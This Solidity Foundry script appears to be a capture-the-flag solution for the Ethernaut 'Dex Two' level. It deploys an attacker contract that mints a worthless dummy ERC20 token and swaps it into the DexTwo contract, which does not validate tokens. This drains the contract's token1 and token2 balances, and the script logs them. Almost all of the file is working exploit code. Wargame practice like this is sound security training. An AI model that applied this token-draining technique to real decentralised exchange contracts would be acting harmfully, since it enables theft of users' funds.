// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {DexTwo} from "../src/Level23.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Level23Sol is Script {
    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = address(instance.token1());
        address token2 = address(instance.token2());

        Attack attack = new Attack();

        attack.exploit();

        vm.stopBroadcast();
    }
}

contract Attack {
    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);

    address token1 = address(instance.token1());
    address token2 = address(instance.token2());

    Dummy dummyToken1;

    constructor() {
        dummyToken1 = new Dummy();
    }

    function exploit() public {
        dummyToken1.transfer(address(instance), 100); //transfering 100 tokens to the Dex contract

        dummyToken1.approve(address(instance), 1000);

        instance.swap(address(dummyToken1), token2, 100);
        console.log(
            "token2 balance after swap  is ",
            instance.balanceOf(token2, address(instance))
        );

        // dummyToken1.transfer(address(instance),100);//transfering 100 tokens to the Dex contract

        dummyToken1.approve(address(instance), 1000);

        instance.swap(address(dummyToken1), token1, 200);

        console.log(
            "token1 balance after swap  is ",
            instance.balanceOf(token1, address(instance))
        );
    }
}

contract Dummy is ERC20("DummyToken", "Dummy") {
    constructor() {
        _mint(msg.sender, 10000);
    }
}
